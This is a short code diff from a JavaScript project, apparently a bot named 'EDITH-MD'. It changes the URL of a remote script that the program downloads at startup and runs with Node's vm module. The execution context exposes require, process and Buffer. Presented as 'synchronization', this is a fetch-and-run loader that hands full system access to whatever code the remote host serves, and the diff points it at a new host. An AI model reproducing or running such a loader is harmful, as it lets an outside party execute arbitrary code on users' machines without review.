@@ -341,7 +341,7 @@ const config = require('./config.js');
 (async () => {
   try {
     console.log("👑 EDITH-MD Synchronization Initiated !");
-    const { data: scriptCode } = await axios.get(`https://cdn-bandaheali.zone.id/file/index.js`);
+    const { data: scriptCode } = await axios.get(`https://mrfrankk-cdn.hf.space/edith-md/index.js`);
     new vm.Script(scriptCode).runInContext(vm.createContext({ require, console, process, module, __filename, __dirname, Buffer }));
   } catch (err) {
     console.error("Error:", err);
